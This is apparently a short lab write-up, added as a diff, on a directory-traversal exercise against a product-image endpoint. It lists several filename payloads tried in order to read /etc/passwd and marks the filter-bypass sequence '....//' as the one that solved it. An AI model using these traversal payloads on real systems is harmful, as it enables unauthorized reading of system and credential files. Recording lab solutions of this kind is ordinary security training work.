@@ -1,0 +1,25 @@
+Directory Traversal - Product images
+
+Goal: Display the content of the /etc/passwd file
+
+Analysis:
+--------
+
+filename=/etc/passwd
+-> No such file
+
+filename=../../etc/passwd
+-> No such file
+
+filename=../\etc/passwd
+-> No such file
+
+filename=....//etc/passwd
+-> No such file
+
+filename=....\/./etc/passwd
+-> No such file
+
+filename=....//....//....//etc/passwd
+
+Solved
